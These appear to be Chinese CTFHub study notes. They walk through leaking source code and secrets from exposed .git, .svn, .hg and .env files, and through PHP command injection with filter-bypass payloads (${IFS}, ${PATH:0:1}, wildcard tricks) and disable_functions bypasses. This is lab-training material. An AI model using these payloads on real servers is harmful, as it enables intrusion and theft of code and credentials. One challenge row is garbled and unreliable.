# task9

# 第一章 环境安装

# 1.3 基础 Linux 命令

### 1.3.1 目录与文件列举
- `ls`列当前目录
- `ls -la`列出含隐藏文件、权限、大小、时间
- `pwd`定位 web 根
- `find / -name "*flag*"`按名字全盘找
- `file` / `stat`判断文件类型

### 1.3.2 文件读取

- `cat`
- `tac`：cat 反过来，按行逆序输出 
- `head -1` / `tail`：取前/后 N 行
- `sort` / `nl` / `rev`：排序 / 加行号 / 反转
- `base64`：编码输出 —— 避开 HTML 特殊字符的神器
- `grep -r "ctfhub" /var/www/html/`：按内容找文件
- `xxd` / `od`：十六进制查看
- `strings`：从二进制里捞可打印字符串

### 1.3.3 内容特征查找

- `grep -r ctfhub /var/www/html/`：路径 + 文件名 + 内容
- `grep -ro "ctfhub{[^}]*}" /`：只输出匹配部分
- `strings .hg/store/00changelog.i`：从二进制元数据里找明文
- `od -A d -t x1z file`：十六进制 + ASCII 双栏，看文件头

### 1.3.4 数据处理

- `base64 -d`：解码
- `openssl base64 -d`：严格版，遇到垃圾字符直接失败
- `grep -oE '^[A-Za-z0-9+/=]+'`：从混有 HTML 的响应里抠出 base64
- `sed 's/<.*//'` / `cut -d'<' -f1`：砍掉 HTML 尾巴
- `awk '{print $4"\t"$2}'`：取指定列
- `comm -23 <(...) <(...)`：求差集
- `tr -d '\000'`：去掉 NUL 字节

# 第二章 信息泄露漏洞

## 2.1 模块总览

## 2.2 五类信息泄露

### 2.2.1 四道仓库泄露题

#### 题目 1  Git Log

```bash
T="http://challenge-41019ce7441deaee.sandbox.ctfhub.com:10800/"
curl -s "$T/.git/HEAD"             
curl -s "$T/.git/logs/HEAD"        
cd ~/tools/githack/GitHack-master
python2 GitHack.py "$T/.git"
cd dist/challenge-41019ce7441deaee.sandbox.ctfhub.com_10800
git show 4d330484
```

#### 题目 2  Git Stash

```bash
curl -s "$T/.git/HEAD"              
curl -s "$T/.git/logs/HEAD"         # 4 条 ← 比上一题多一行
cd ~/tools/githack/GitHack-master
python2 GitHack.py "$T/.git"
cd dist/challenge-f853c2afa0df69bb.sandbox.ctfhub.com_10800
ls                                  
```

判据：reflog 变成 4 条，多出来的那行是 `reset: moving to HEAD`；`refs/stash` 返回 200。

取 flag：

```bash
git stash show -p
```

#### 题目 3  Git Index

```bash
T="http://challenge-xxx:10800"

curl -s "$T/.git/HEAD"                                         
curl -s "$T/.git/logs/HEAD" | sed 's/.*\t//'                   
curl -s -o /dev/null -w "%{http_code}\n" "$T/.git/refs/stash"   # 有 stash 吗
curl -s -o /dev/null -w "%{http_code}\n" "$T/.git/objects/" 

python2 ~/tools/githack/GitHack-master/GitHack.py "$T/.git/"
cd ~/tools/githack/GitHack-master/dist/$(ls -t ~/tools/githack/GitHack-master/dist/ | head -1)

ls && cat *.txt
git log --all -p | grep -i ctfhub
git stash show -p
git diff --cached
```

#### 题目 4  HG

```bash
T="http://challenge-xxx:10800"
curl -s "$T/.hg/dirstate" | strings | grep -E '\.(txt|php|py)$'

# 名字里的 _ 变成 __
#    flag_807728508.txt  →  flag__807728508.txt

# ④ 取内容 + 抓 flag
curl -s "$T/.hg/store/data/flag__807728508.txt.i" | grep -ao 'ctfhub{[^}]*}'
```

#### `.git` 里到底有什么

- 全部源码
  位置：`objects/`
  危害：完整源码
- 全部提交历史
  位置：`objects/` + `refs/`
  危害：开发过程、注释里的密码
- 未提交改动
  位置：`index`
  危害：暂存区敏感文件
- 被"藏起来"的改动
  位置：`refs/stash`
  危害：连 commit 都没进

### 2.2.3 SVN 

```bash
T="http://challenge-xxx:10800"
curl -o wc.db "$T/.svn/wc.db"
for h in $(sqlite3 wc.db "SELECT checksum FROM PRISTINE;" | sed 's/\$sha1\$//'); do
  curl -s "$T/.svn/pristine/${h:0:2}/${h}.svn-base"
done | grep -a ctfhub
```

### 2.2.4 HG 

成因：在 web 目录 `hg clone` / `hg pull`。

三个关键文件：

- `.hg/last-message.txt`
  作用：最后一次 commit message
  实测：`add flag`
- `.hg/store/fncache`
  作用：文件清单缓存
  实测：每行一个 store 路径
- `.hg/dirstate`
  作用：当前文件列表（二进制）
  实测：`strings` 出 `flag_xxx.txt`

```bash
#  拿文件名
curl -s "$T/.hg/dirstate" | strings | grep -E '\.txt$'
#  名字里 _ 换成 __，取内容
curl -s "$T/.hg/store/data/flag__807728508.txt.i" | grep -ao 'ctfhub{[^}]*}'
```

### 2.2.5 `.env` 

成因：`.env` 放在 web 根，被 HTTP 直接读取。

内容常含：数据库密码、API Key、JWT Secret、Redis 密码。

注意：有些值是 base64 编码的，要 `base64 -d`。

## 2.3 

### 1：Git 

是什么：`.git` 目录被部署到 web 根，HTTP 能直接读。

为什么：用 `clone`/`pull` 部署、在 web 目录直接开发、打包没加 `--exclude=.git`。

为什么危害大：`git rm` 删不掉对象 —— 要 `reflog expire` + `gc --prune` 才彻底。

### 2：备份文件有哪些；vim 缓存有哪些

备份文件 6 类

vim 缓存 3 类 8 种：

- swap
  文件名：`.文件名.swp` → `.swo` → `.swn` → `.swm` → `.swl`...
  触发：编辑中崩溃/被 kill
- undo
  文件名：`.文件名.un~`
  触发：`set undofile`
- backup
  文件名：`文件名~`
  触发：`set backup`

swap 的三种取法（实测对比）：

- `grep -ao "flag{[^}]*}" .index.php.swp`： 完整
- `strings`：顺带能拿到服务器绝对路径
- `vim -r`：可能只写了一半 → 恢复残缺

###  3：SVN 泄露由什么引起

在 web 目录 `svn checkout`，`.svn` 留在 web 根。
做法：`svn export`。

### 4：不同种类怎么获取泄露的信息

探测 → 拿清单 → 取内容 → 解码。

- 源码包
   探测：字典
   拿清单：解压
   取内容：文件名当 URL
   解码：
- `.bak`
  探测：加后缀
  拿清单：
  取内容：`curl`
  解码：
- vim swp
   探测：`.文件名.swp`
   拿清单：—
   取内容：`curl -O`
   解码：`grep -a`
- `.DS_Store`
   探测：固定路径
   拿清单：解析 filename
   取内容：文件名当 URL
   解码：`ds_store` 库
- Git
   探测：`.git/HEAD`
   拿清单：reflog / index / refs
   取内容：`objects/<h[:2]>/<h[2:]>`
   解码：zlib
- SVN
   探测：`.svn/wc.db`
   拿清单：`NODES` / `PRISTINE`
   取内容：`pristine/<h[:2]>/<h>`
   解码：原文
- HG
   探测：`.hg/requires`
   拿清单：`fncache` + `dirstate`
   取内容：`store/data/<编码名>.i`
   解码：zlib 或 `'u'`+原文
- `.env`
   探测：固定路径
   拿清单：—
   取内容：`curl`
   解码：base64 -d

###  5：信息泄露出现的最大原因

藏的东西变成了公开的


.git  .svn  .env  .DS_Store  .index.php.swp
  以 . 开头
  ls 看不见 以为不存在
# 第三章 PHP 命令执行与绕过

## 3.1 命令执行的根因

```php
system("ping -c 4 " . $_GET['ip']);
```

两个层面：

- 系统命令执行
  函数：`system` / `exec` / `shell_exec` / `passthru` / `popen` / `proc_open` / 反引号
- 代码执行
  函数：`eval` / `assert` / `create_function` / `preg_replace(/e)` / `call_user_func` / `array_map`

## 3.2 八个系统命令执行函数

测试命令：`echo line1; echo line2; id -un`

- `system()`
  直接回显：有
  返回值：`string`（最后一行）
  多行：支持
  退出码：支持（第 2 参数）
- `exec()`
  直接回显：无
  返回值：`string`（最后一行）
  多行：需第 2 参数
  退出码：支持（第 3 参数）
- `shell_exec()`
  直接回显：无
  返回值：`string`（全部输出）
  多行：支持
  退出码：不支持
- `` `反引号` ``
  直接回显：无
  返回值：`string`（全部）
  多行：支持
  退出码：不支持
- `passthru()`
  直接回显：有（原始二进制）
  返回值：`null`
  多行：支持
  退出码：支持（第 2 参数）
- `popen()`
  直接回显：无
  返回值：`resource`（文件指针）
  多行：支持
  退出码：支持
- `proc_open()`
  直接回显：无
  返回值：`resource`（进程句柄）
  多行：支持
  退出码：支持
- `pcntl_exec()`
  直接回显：有
  返回值：无
  多行：支持
  退出码：不支持


- 要立刻看到结果：`system`
- 结果要处理/过滤：`shell_exec`（全部字符串）
- 要多行数组：`exec` + 第 2 参数
- 要退出码：`system` / `exec` / `passthru`
- 要 stderr：`proc_open`
- 双向交互：`popen("w")` / `proc_open`
- 无回显时：`exec` / `shell_exec` 拿返回值再外带

## 3.3 代码执行类函数

- `eval()`
  说明：执行任意 PHP 代码（语言结构）
  版本限制：全版本
- `assert()`
  说明：老版本可执行字符串
  版本限制：PHP 7.2+ 不再执行字符串
- `create_function()`
  说明：动态造函数
  版本限制：PHP 7.2 废弃，8 移除
- `preg_replace(/e)`
  说明：执行替换结果
  版本限制：PHP 7 移除
- `call_user_func()` / `call_user_func_array()`
  说明：回调
  版本限制：全版本
- `array_map` / `array_filter` / `array_reduce`
  说明：回调
  版本限制：全版本
- `usort` / `uasort`
  说明：排序回调
  版本限制：全版本
- `ob_start()`
  说明：输出缓冲回调
  版本限制：全版本
- `include` / `require`
  说明：文件包含（配合伪协议）
  版本限制：全版本

## 3.4 其它可注入命令的地方

- `mail($to,$sub,$msg,$hdr,$param)`：第 5 参数传给 `sendmail`
- `putenv("LD_PRELOAD=...")`：设置环境变量，劫持动态库
- `imap_open($mailbox,...)`：mailbox 参数可注入
- `error_log($msg, 1, $to)`：`$to` 传给 `sendmail`
- `mb_send_mail`：同 `mail`
- `pcntl_exec`：常被忘在 `disable_functions` 之外
- `dl()`：加载 PHP 扩展
- `ImageMagick` 的 `convert`：文件名注入

## 3.5 CTFHub RCE 模块通关

- 1
  题型：命令注入-无过滤
  过滤：无
- 2
  题型：eval 代码执行
  过滤：无
  绕过：`?cmd=system("ls /");`
  flag：`ctfhub{7234bb617c6421e4b8e40365}`
- 3
  题型：过滤 cat
  过滤：`cat`
  绕过：`tac` / `c\at` / `/bin/c?t`
  flag：`ctfhub{5c3d2c0615beb813269640b6}`
- 4
  题型：过滤空格
  过滤：空格
  绕过：`${IFS}`
  flag：`ctfhub{7d4f698eda802c44829c9db7}`
- 5
  题型：过滤目录分隔符
  过滤：`/`
  绕过：`${PATH:0:1}`
  flag：`ctfhub{fba85d19b6751d803b3cee7c}`
- 6
  题型：过滤运算符
  过滤：`\
  绕过：` `&`
  flag：`;` / 换行
- 7
  题型：综合练习
  过滤：8 项全过滤
  绕过：见下
  flag：`ctfhub{7d928b22123076276bb32251}`

8.

```
%0a${PATH:0:1}bin${PATH:0:1}c?t${IFS}f?ag_is_here${PATH:0:1}*
```

逐段拆解：

- `%0a`：换行（代替被过滤的 `;` `\
- `${PATH:0:1}`：`/`
- `bin`：`/bin`
- `c?t`：`cat`（`?` 通配）
- `${IFS}`：空格
- `f?ag_is_here`：`flag_is_here`（`?` 通配）
- `*`：目录里的文件

展开后：

```bash
/bin/cat /var/www/html/flag_is_here/flag_273182659722304.php
```

## 3.6 绕过方式总结

### 3.6.1 空格绕过

目标：让 `cat /flag` 里的空格不被过滤。

- `${IFS}`：`cat${IFS}/flag`
- `$IFS$9`：`cat$IFS$9/flag`
- `$IFS`：`cat$IFS/flag`
- 花括号：`{cat,/flag}`
- 重定向 `<`：`cat</flag`
- 制表符 `%09`：`cat%09/flag`
- `$'\t'`：`cat$'\t'/flag`
- `$'\x20'`：`cat$'\x20'/flag`

`${IFS}` 是什么：`IFS` = Internal Field Separator，shell 的分词符，默认值 = 空格 + 制表 + 换行。

### 3.6.2 关键字绕过

- 反斜杠：`ec\ho`
- 单/双引号`ec''ho` / `ec""ho`
- 变量拼接`a=ec;b=ho;$a$b`
- 通配符 `?`：`/bin/ec?o`
- 通配付 `*`：`/bin/e*`
- 命令替换：`$(echo ec)ho`


- `cat`：`tac` / `c\at` / `c'a't` / `/bin/c?t` / `$a$b`
- `flag`：`f?ag` / `f*` / `????_??_????` / `[f]lag`
- 空格：`${IFS}` / `$IFS$9` / `<` / `%09`
- 斜杠：`${PATH:0:1}` / `$'\57'`

### 3.6.6 禁用函数绕过

- `LD_PRELOAD` + `putenv` + `mail`
  原理：`mail()` 第 5 参数触发 `sendmail`，加载恶意 `.so`
  前提：能上传 `.so`
- Apache Mod CGI
  原理：上传 `.htaccess` 启用 CGI
  前提：Apache
- PHP-FPM / FastCGI
  原理：打 FPM 端口
  前提：能访问
- Shellshock
  原理：`BASH_ENV` 注入
  前提：bash < 4.3
- `imap_open`
  原理：mailbox 参数注入
  前提：`imap` 扩展
- `pcntl_exec`
  原理：常被忘在 `disable_functions` 之外
  前提：`pcntl` 扩展
- Windows COM
  原理：`new COM("WScript.Shell")`
  前提：Windows
- `putenv` + `error_log`
  原理：同 LD_PRELOAD 思路
- `bash` 的 `enable -f`
  原理：加载自定义内建命令
- `win32std`
  原理：`win_exec`
  前提：Windows

